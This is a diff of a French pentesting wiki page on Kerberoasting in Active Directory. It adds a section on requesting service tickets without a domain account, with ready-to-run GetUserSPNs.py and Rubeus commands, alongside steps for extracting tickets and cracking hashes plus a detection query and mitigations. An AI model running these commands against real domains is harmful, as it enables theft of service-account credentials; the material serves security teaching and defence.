@@ -72,7 +72,7 @@ Voici les étapes à suivre :
 3. Une fois que vous avez obtenu le TGS, utilisez l'outil `kirbi2john.py` pour extraire le hash du mot de passe du TGS.
 4. Utilisez un outil de craquage de mots de passe, tel que Hashcat, pour casser le hash du mot de passe et récupérer le mot de passe en clair.
 
-Il est important de noter que cette technique nécessite des privilèges d'administrateur sur le contrôleur de domaine pour demander le TGS. De plus, vous devez avoir un accès en lecture à la mémoire de l'utilisateur cible pour extraire le TGS.
+Il est important de noter que cette technique nécessite des privilèges d'administrateur sur la machine cible pour extraire le TGS de la mémoire.
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -155,6 +155,28 @@ Kerberoast est très furtif s'il est exploitable
 * Utilisez des comptes de service gérés (changement automatique du mot de passe périodiquement et gestion déléguée des SPN)
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
+```
+## Kerberoast sans compte de domaine
+
+En septembre 2022, une vulnérabilité a été découverte par [Charlie Clark](https://exploit.ph/), les ST (Service Tickets) peuvent être obtenus via une requête KRB_AS_REQ sans avoir à contrôler un compte Active Directory. Si un principal peut s'authentifier sans pré-authentification (comme une attaque AS-REP Roasting), il est possible de l'utiliser pour lancer une requête **KRB_AS_REQ** et tromper la requête pour demander un **ST** au lieu d'un **TGT** chiffré, en modifiant l'attribut **sname** dans la partie req-body de la requête.
+
+La technique est entièrement expliquée dans cet article : [article de blog Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+
+{% hint style="warning" %}
+Vous devez fournir une liste d'utilisateurs car nous n'avons pas de compte valide pour interroger le LDAP en utilisant cette technique.
+{% endhint %}
+
+#### Linux
+
+* [impacket/GetUserSPNs.py à partir de la PR #1413](https://github.com/fortra/impacket/pull/1413) :
+```bash
+GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
+```
+#### Windows
+
+* [GhostPack/Rubeus à partir de PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+```bash
+Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
 **Plus d'informations sur le Kerberoasting dans ired.team** [**ici**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**et** [**ici**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**
 
